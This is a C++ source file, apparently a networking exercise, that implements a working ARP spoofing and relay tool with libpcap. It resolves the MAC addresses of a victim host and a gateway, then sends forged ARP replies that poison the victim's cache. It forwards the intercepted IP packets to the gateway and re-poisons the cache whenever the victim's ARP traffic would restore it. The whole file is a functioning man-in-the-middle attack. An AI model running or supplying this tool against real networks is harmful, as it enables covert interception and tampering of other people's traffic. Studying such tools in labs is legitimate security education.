#include <cstdio>
#include <pcap.h>
#include <libnet.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <stdbool.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "getmac.h"
#include "getIpAddr.h"
#include <array>


#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

struct eth_hdr{
        unsigned char h_dest[6];        //destination ether addr
        unsigned char h_source[6];      //source ether addr
        unsigned short h_proto;         //packet type id filed
} __attribute__((packed));

struct arp_hdr{

    unsigned short ar_hrd;          //hardware type : ethernet
    unsigned short ar_pro;          //protocol      : ip
    unsigned char  ar_hln;          //hardware size
    unsigned char  ar_pln;          //protocal size
    unsigned short ar_op;           //opcode request or reply
    unsigned char  ar_sha[6];       //sender mac
    //unsigned int  ar_sip[4];       //sender IP
	struct in_addr ar_sip;
    unsigned char  ar_tha[6];       //Target mac (my)
    struct in_addr ar_tip;       //Target IP  (my)
} __attribute__((packed));

struct ip_hdr
{
    unsigned char ip_header_len:4;  /* header length */
    unsigned char ip_version:4;     /* version */
    unsigned char ip_tos;           /* type of service */
    unsigned short ip_total_length; /* total length */
    unsigned short ip_id;           /* identification */
    unsigned char ip_frag_offset:5; /* fragment offset field */
    unsigned char ip_reserved_zero:1;   /* reserved fragment flag */
    unsigned char ip_dont_fragment:1;   /* dont fragment flag */
    unsigned char ip_more_fragment:1;   /* more fragments flag */
    unsigned char ip_frag_offset1;      /* mask for fragmenting bits */
    unsigned char ip_ttl;           /* time to live */
    unsigned char ip_protocol;      /* protocol */
    unsigned short ip_checksum;     /* checksum */
    struct in_addr ip_srcaddr;      /* source address */
    struct in_addr ip_destaddr;     /* destination address */
} __attribute__((packed));

#pragma pack(push, 1)
struct EthIpPacket {
    eth_hdr eth_;
    ip_hdr ip_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface> <senderIP> <targetIP>\n");
	printf("sample: send-arp-test wlan0 172.30.1.40 172.30.1.254\n");
}

int sendArpPacket(char* dev, char* eth_dmac, char* eth_smac, uint16_t my_arp_op,
                  char* arp_smac, char* arp_sip, char* arp_tmac, char* arp_tip,
                  pcap_t* handle){


    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(eth_dmac); // victim.mac a0:c5:89:77:cb:03
    packet.eth_.smac_ = Mac(eth_smac); // me
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(my_arp_op); // Request
    packet.arp_.smac_ = Mac(arp_smac); // me.mac
    packet.arp_.sip_ = htonl(Ip(arp_sip)); // me.ip
    //packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // victim.mac
    packet.arp_.tmac_ = Mac(arp_tmac); // victim.mac
    //packet.arp_.tip_ = htonl(Ip(argv[2])); // victim.ip
    packet.arp_.tip_ = htonl(Ip(arp_tip)); // victim.ip

    //unsigned char buffer[sizeof(EthArpPacket)];
    //memcpy(buffer, &packet, sizeof(EthArpPacket));
    //for(unsigned long i=0;i<sizeof(EthArpPacket);i++) printf("%02x ", buffer[i]);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }


    printf("1\n");
    return 1;
}

int getSomeoneMacAddr(char* dev, char* eth_dmac, char* eth_smac, uint16_t my_arp_op,
                      char* arp_smac, char* arp_sip, char* arp_tmac, char* arp_tip,
                      char* resultMacAddr, pcap_t* handle1){
    while (true) {
        // stage 1 ----------------------------------------------------
        sendArpPacket(dev, eth_dmac, eth_smac, my_arp_op,
                      arp_smac, arp_sip, arp_tmac, arp_tip, handle1);
        // endof stage 1 ----------------------------------------------

        // stage 2 ------------------------------------------------

        struct pcap_pkthdr* header;
        struct eth_hdr* ehdr;
        struct arp_hdr* ahdr;

        unsigned short ehdr_proto;
        const u_char* packet0;


        int res = pcap_next_ex(handle1, &header, &packet0);

        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle1));
            break;
        }
        ehdr = (struct eth_hdr *)packet0;

        size_t ehdr_dmac_2_size = strlen(ether_ntoa((struct ether_addr *)ehdr->h_dest))+1;
        char* ehdr_dmac_2 = (char*)malloc(ehdr_dmac_2_size);
        strncpy(ehdr_dmac_2, ether_ntoa((struct ether_addr *)ehdr->h_dest), ehdr_dmac_2_size);

        ehdr_proto = htons(ehdr->h_proto);
        packet0 += 14;


        int breakFlag = 0;
        printf("2 ehdr_proto : %d\n", ehdr_proto);
        if(ehdr_proto == 2054){
            ahdr = (struct arp_hdr *)packet0;

            unsigned short ahdr_op = htons(ahdr->ar_op);
            char ahdr_sip[20];
            strcpy(ahdr_sip, inet_ntoa((ahdr->ar_sip)));

            printf("=============================================\n");
            printf("ehdr_dmac : %s\n", ehdr_dmac_2);
            printf("ehdr_proto : %u\n", ehdr_proto);
            printf("ahdr_op : %u\n", ahdr_op);
            printf("ahdr_sip : %s\n", ahdr_sip);
            printf("arp_tip (calls to whom?) : %s\n", arp_tip);


            bool flag1 = strcmp(ehdr_dmac_2, eth_smac) ? 0 : 1;
            bool flag2 = ehdr_proto == 2054;
            bool flag3 = ahdr_op == 2;
            bool flag4 = strcmp(ahdr_sip, arp_tip) == 0 ? 1 : 0;
            printf("flag : %d %d %d %d\n", flag1, flag2, flag3, flag4);

            if(flag1 && flag2 && flag3 && flag4){

                strcpy(reinterpret_cast<char *>(resultMacAddr),
                       ether_ntoa((const struct ether_addr *)(ahdr->ar_sha)));
                breakFlag = 1;
            }
        }


        free(ehdr_dmac_2);
        if(breakFlag) break;
    }

    return 1;
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}
	char* dev = argv[1];
    char SENDER_IP[16];
    strcpy(SENDER_IP, argv[2]);
    char TARGET_IP[16];
    strcpy(TARGET_IP, argv[3]);
    char BROAD_ETH_DMAC[18] = "ff:ff:ff:ff:ff:ff";
    char BROAD_ARP_TMAC[18] = "00:00:00:00:00:00";

    size_t myMacSize = strlen(getMacAddr(argv[1]))+1;
	char* myMacAddr = (char*)malloc(myMacSize);
	strncpy(myMacAddr, getMacAddr(argv[1]), myMacSize);
	
    char myIpAddr[20];
    strcpy(myIpAddr, getIpAddr(dev));

    char victimMacAddr[18];
    //char targetMacAddr[18] = "88:3c:1c:72:e2:9d";
    char targetMacAddr[18];

    char errbuf1[PCAP_ERRBUF_SIZE];
    pcap_t* handle1 = pcap_open_live(dev, BUFSIZ, 1, 500, errbuf1);
    if (handle1 == nullptr) {
        fprintf(stderr, "pcap_open_live(%s) return nullptr - %s\n", dev, errbuf1);
        return -1;
    }

    getSomeoneMacAddr(dev, BROAD_ETH_DMAC, myMacAddr, ArpHdr::Request,
                      myMacAddr, myIpAddr, BROAD_ARP_TMAC, TARGET_IP,
                      targetMacAddr, handle1);
    printf("targetMacAddr : %s\n", targetMacAddr);

    getSomeoneMacAddr(dev, BROAD_ETH_DMAC, myMacAddr, ArpHdr::Request,
                      myMacAddr, myIpAddr, BROAD_ARP_TMAC, SENDER_IP,
                      victimMacAddr, handle1);
    printf("victimMacAddr : %s\n", victimMacAddr);


    // stage 3 ------------------------------------------------
    sendArpPacket(dev, victimMacAddr, myMacAddr, ArpHdr::Reply,
                  myMacAddr, TARGET_IP, victimMacAddr, SENDER_IP, handle1);
    // endof stage 3 ------------------------------------------

    while(true){

        // stage 4 ------------------------------------------------

        struct pcap_pkthdr* header;
        struct eth_hdr* ehdr;
        struct ip_hdr* ihdr;

        char* ehdr_dmac_4;
        char ehdr_smac_4[40] = {0, }; // plz check again
        short ehdr_proto_4;
        char ihdr_sip_4[40];
        char ihdr_dip_4[40];
        const u_char* packet4;

        int res = pcap_next_ex(handle1, &header, &packet4);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle1));
            break;
        }
        ehdr = (struct eth_hdr *)packet4;


        strcpy(ehdr_smac_4, ether_ntoa((struct ether_addr *)ehdr->h_source));

        size_t ehdr_dmac_4_size = strlen(ether_ntoa((struct ether_addr *)ehdr->h_dest))+1;
        ehdr_dmac_4 = (char*)malloc(ehdr_dmac_4_size);
        strncpy(ehdr_dmac_4, ether_ntoa((struct ether_addr *)ehdr->h_dest), ehdr_dmac_4_size);

        ehdr_proto_4 = htons(ehdr->h_proto);

        if(ehdr_proto_4 == 2048){
            //packet4 += 14;
            ihdr = (struct ip_hdr *)(packet4+14);
            int packet_len = ntohs(ihdr->ip_total_length) + sizeof(struct eth_hdr);


            strcpy(ihdr_sip_4, inet_ntoa((ihdr->ip_srcaddr)));
            strcpy(ihdr_dip_4, inet_ntoa((ihdr->ip_destaddr)));

            printf("stage 4 =====================================\n");
            printf("ehdr_smac_4 : %s\n", ehdr_smac_4); // desired value : 00:07:89:63:05:5d
            printf("ehdr_dmac_4 : %s\n", ehdr_dmac_4);
            printf("ehdr_proto_4 : %u\n", ehdr_proto_4);
            printf("idhr_sip_4 : %s\n", ihdr_sip_4); // desired value : 172.30.1.40

            int cmp = strcmp(ehdr_smac_4, victimMacAddr);
            bool flag1 = cmp ? 0 : 1; // ehdr_smac
            bool flag2 = strcmp(ehdr_dmac_4, myMacAddr) == 0 ? 1 : 0; // ihdr_sip
            bool flag3 = ehdr_proto_4 == 2048; // ehdr_protocol
            bool flag4 = strcmp(ihdr_sip_4, SENDER_IP) == 0 ? 1 : 0; // ihdr_sip
            printf("spoofed packet flag : %d %d %d %d\n", flag1, flag2, flag3, flag4);

            if(flag1 && flag2 && flag3 && flag4){ // spoofed -> then relay
                // stage 5------------------------------------
                Mac *dMac = new Mac(targetMacAddr);
                Mac *sMac = new Mac(myMacAddr);
                memcpy((u_char*)packet4, dMac, 6);
                memcpy((u_char*)packet4+6, sMac, 6);

                int i;
                printf("packet_len : %u\n", packet_len);
                for(i=0;i<packet_len / 2;i++){
                    printf("%02x ", reinterpret_cast<const u_char*>(packet4)[i]);
                }
                printf("i : %d\n", i);
                printf("addr of packet4 : %p\n", &packet4);

                int res = pcap_sendpacket(handle1, reinterpret_cast<const u_char*>(packet4), packet_len);
                if (res != 0) {
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle1));
                }
                printf("*******relay complete !!*******\n");
                // endof stage 5 -----------------------------
                //break;
            }
        }
    // endof stage 4 ------------------------------------------

    // stage 6 ------------------------------------------------
        if(ehdr_proto_4 == 2054){

            struct arp_hdr* ahdr;
            char ahdr_sip_6[40];
            char ahdr_tip_6[40];

            ahdr = (struct arp_hdr *)(packet4 + 14);
            strcpy(ahdr_sip_6, inet_ntoa((ahdr->ar_sip)));
            strcpy(ahdr_tip_6, inet_ntoa((ahdr->ar_tip)));
            unsigned short ahdr_op = htons(ahdr->ar_op);

            printf("stage 6 -------------------------------------\n");
            printf("ehdr_dmac_4 : %s\n", ehdr_dmac_4); // desired value : 00:07:89:63:05:5d
            printf("ehdr_proto_4 : %u\n", ehdr_proto_4);
            printf("ar_op : %u\n", ahdr_op);
            printf("adhr_sip_6 : %s\n", ahdr_sip_6); // desired value : 172.30.1.40
            printf("adhr_dip_6 : %s\n", ahdr_tip_6); // desired value : 172.30.1.254

            bool flag1 = strcmp(ehdr_dmac_4, myMacAddr) == 0 ? 1 : 0; // ehdr_dmac
            bool flag1_ver2 = strcmp(ehdr_dmac_4, BROAD_ETH_DMAC) == 0 ? 1 : 0;

            bool flag3 = ahdr_op == 1 ? 1 : 0; // ahdr_op
            bool flag4 = strcmp(ahdr_sip_6, SENDER_IP) == 0 ? 1 : 0; // ahdr_sip
            bool flag5 = strcmp(ahdr_tip_6, TARGET_IP) == 0 ? 1 : 0; // ahdr_tip

            bool flag5_ver8 = strcmp(ahdr_tip_6, SENDER_IP) == 0 ? 1 : 0; // ahdr_tip
            //bool flag6 = strcmp(ahdr_tip_6, BROAD_ARP_TMAC) == 0 ? 1 : 0;
            printf("flag : %d %d(ver2) %d %d %d %d\n", flag1, flag1_ver2, flag3, flag4, flag5, flag5_ver8);




            if(flag1 && flag3 && flag4 && flag5){
                //printf("unicast arp-table recovering trial\n");
                // stage 7------------------------------------
                sendArpPacket(dev, victimMacAddr, myMacAddr, ArpHdr::Reply,
                              myMacAddr, TARGET_IP, victimMacAddr, SENDER_IP, handle1);
                // endof stage 7 -----------------------------
                printf("*******reinfest complete (unicast) !!*******\n");
                //break;
            }

            if(flag1_ver2 && flag3 && flag5_ver8){
                //printf("broadcast arp-table recovering trial\n");
                // stage 8------------------------------------
                sendArpPacket(dev, victimMacAddr, myMacAddr, ArpHdr::Reply,
                              myMacAddr, TARGET_IP, victimMacAddr, SENDER_IP, handle1);
                printf("*******reinfest complete (broadcast) !!*******\n");
                // endof stage 8 -----------------------------

                //break;
            }

            if(flag1_ver2 && flag3 && flag4 && flag5){

                // stage 8------------------------------------
                sendArpPacket(dev, victimMacAddr, myMacAddr, ArpHdr::Reply,
                              myMacAddr, TARGET_IP, victimMacAddr, SENDER_IP, handle1);
                //printf("*******reinfest complete (sender's broadcast) !!*******\n");
                // endof stage 8 -----------------------------

                //break;
            }
            //unicast   - ether_dmac, ether_protocol, arp_op, arp_sip, arp_tip
            //broadcast - ether_dmac_ver2, ether_protocol, arp_op, arp_sip, arp_tip, arp_dmac


        // endof stage 6 ------------------------------------------
      }
    }
    pcap_close(handle1);
}
